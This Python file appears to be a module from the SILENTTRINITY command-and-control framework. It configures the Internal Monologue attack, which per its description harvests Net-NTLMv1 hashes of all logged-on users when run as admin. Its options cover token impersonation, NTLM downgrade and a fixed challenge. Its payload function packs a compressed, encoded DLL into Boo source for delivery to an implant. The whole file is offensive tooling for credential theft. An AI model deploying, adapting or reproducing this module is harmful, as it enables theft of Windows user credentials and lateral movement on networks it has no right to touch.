from silenttrinity.core.utils import get_path_in_package
from silenttrinity.core.teamserver.module import Module
from silenttrinity.core.teamserver.utils import dotnet_deflate_and_encode


class STModule(Module):
    def __init__(self):
        self.name = 'boo/internalmonologue'
        self.language = 'boo'
        self.description = 'Executes the Internal Monologue attack.\nIf admin, this will give you the Net-NTLMv1 hashes of all logged on users'
        self.author = '@byt3bl33d3r'
        self.references = []
        self.options = {
            'Impersonate': {
                'Description'   :   'Specifies whether to try to impersonate all other available users or not',
                'Required'      :   False,
                'Value'         :   True
            },
            'Threads': {
                'Description'   :   'Specifies whether to try to locate tokens to impersonate from threads or not',
                'Required'      :   False,
                'Value'         :   False,
            },
            'Downgrade': {
                'Description'   :   'Specifies whether to perform an NTLM downgrade or not',
                'Required'      :   False,
                'Value'         :   True,
            },
            'Restore': {
                'Description'   :   'Specifies whether to restore the original values from before the NTLM downgrade or not',
                'Required'      :   False,
                'Value'         :   True,
            },
            'Challenge': {
                'Description'   :   'Specifies the NTLM challenge to be used. An 8-byte long value in ascii-hex representation',
                'Required'      :   False,
                'Value'         :   "1122334455667788",
            },
            'Verbose': {
                'Description'   :   'Specifies whether print verbose output or not',
                'Required'      :   False,
                'Value'         :   True,
            }
        }

    def payload(self):
        with open(get_path_in_package('core/teamserver/data/internalmonologue.dll'), 'rb') as dll:
            with open(get_path_in_package('core/teamserver/modules/boo/src/internalmonologue.boo')) as module_src:
                src = module_src.read()
                src = src.replace("INTERNAL_MONOLOGUE_DLL", dotnet_deflate_and_encode(dll.read()))
                src = src.replace("impersonate=", f"impersonate={self.options['Impersonate']['Value']}".lower())
                src = src.replace("threads=", f"threads={self.options['Threads']['Value']}".lower())
                src = src.replace("downgrade=", f"downgrade={self.options['Downgrade']['Value']}".lower())
                src = src.replace("restore=", f"restore={self.options['Restore']['Value']}".lower())
                src = src.replace("challenge=", f"challenge=\"{self.options['Challenge']['Value']}\"".lower())
                src = src.replace("verbose=", f"verbose={self.options['Verbose']['Value']}".lower())
                return src
